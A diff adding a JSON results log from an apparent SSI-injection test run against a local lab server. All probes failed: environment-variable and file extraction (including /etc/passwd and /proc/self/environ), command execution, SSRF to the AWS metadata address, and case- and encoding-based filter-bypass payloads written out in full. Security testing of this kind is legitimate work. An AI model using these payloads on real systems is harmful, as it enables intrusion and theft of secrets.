@@ -1,0 +1,188 @@
+{
+  "submit_url": "http://127.0.0.1/cgi-bin/submit.cgi",
+  "view_url": "http://127.0.0.1/comment.shtml",
+  "timestamp": "2026-10-14T14:47:01.353641Z",
+  "phases": {
+    "detection": {
+      "echo_date": {
+        "confirmed": false,
+        "indicator": null,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "exec_id": {
+        "confirmed": false,
+        "indicator": null,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "exec_whoami": {
+        "confirmed": false,
+        "indicator": null,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "include_secret": {
+        "confirmed": false,
+        "indicator": null,
+        "snippet": "[an error occurred while processing this directive]\n"
+      }
+    },
+    "env_extraction": {
+      "DATE_LOCAL": "[an error occurred while processing this directive]",
+      "DATE_GMT": "[an error occurred while processing this directive]",
+      "DOCUMENT_ROOT": "[an error occurred while processing this directive]",
+      "QUERY_STRING": "[an error occurred while processing this directive]",
+      "REMOTE_ADDR": "[an error occurred while processing this directive]",
+      "SERVER_NAME": "[an error occurred while processing this directive]",
+      "SERVER_SOFTWARE": "[an error occurred while processing this directive]",
+      "HTTP_USER_AGENT": "[an error occurred while processing this directive]"
+    },
+    "file_extraction": [
+      {
+        "path": "/secret.txt",
+        "method": "include_virtual",
+        "found": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "path": "/index.html",
+        "method": "include_virtual",
+        "found": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "path": "/etc/passwd",
+        "method": "exec_cat",
+        "found": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "path": "/etc/hostname",
+        "method": "exec_cat",
+        "found": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "path": "/etc/hosts",
+        "method": "exec_cat",
+        "found": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "path": "/proc/self/environ",
+        "method": "exec_cat",
+        "found": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "path": "/etc/apache2/apache2.conf",
+        "method": "exec_cat",
+        "found": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      }
+    ],
+    "command_execution": [
+      {
+        "command": "id",
+        "executed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "command": "whoami",
+        "executed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "command": "uname -a",
+        "executed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "command": "pwd",
+        "executed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      {
+        "command": "cat /etc/hostname",
+        "executed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      }
+    ],
+    "ssrf": {
+      "aws_metadata": {
+        "url": "http://169.254.169.254/latest/meta-data/",
+        "hit": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "localhost_admin": {
+        "url": "http://127.0.0.1/",
+        "hit": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "own_secret": {
+        "url": "/secret.txt",
+        "hit": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      }
+    },
+    "rce": {
+      "whoami": {
+        "executed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "id": {
+        "executed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "uname -a": {
+        "executed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "pwd": {
+        "executed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      }
+    },
+    "filter_bypass": {
+      "lower": {
+        "payload": "<!--#echo var=\"DATE_LOCAL\" -->",
+        "bypassed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "UPPER": {
+        "payload": "<!--#ECHO VAR=\"DATE_LOCAL\" -->",
+        "bypassed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "MiXeD": {
+        "payload": "<!--#EcHo VaR=\"DATE_LOCAL\" -->",
+        "bypassed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "extra_space": {
+        "payload": "<!--#  echo   var=\"DATE_LOCAL\"   -->",
+        "bypassed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "no_space": {
+        "payload": "<!--#echo var=\"DATE_LOCAL\"-->",
+        "bypassed": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      },
+      "url_encoded": {
+        "payload": "<!--%23echo var=\"DATE_LOCAL\" -->",
+        "bypassed": false,
+        "snippet": "<!--%23echo+var=\"DATE_LOCAL\"+-->\n"
+      },
+      "double_encoded": {
+        "payload": "<!--%2523echo var=\"DATE_LOCAL\" -->",
+        "bypassed": false,
+        "snippet": "<!--%2523echo+var=\"DATE_LOCAL\"+-->\n"
+      }
+    },
+    "xss": {
+      "xss_basic": {
+        "hit": false,
+        "snippet": "[an error occurred while processing this directive]\n"
+      }
+    }
+  }
+}
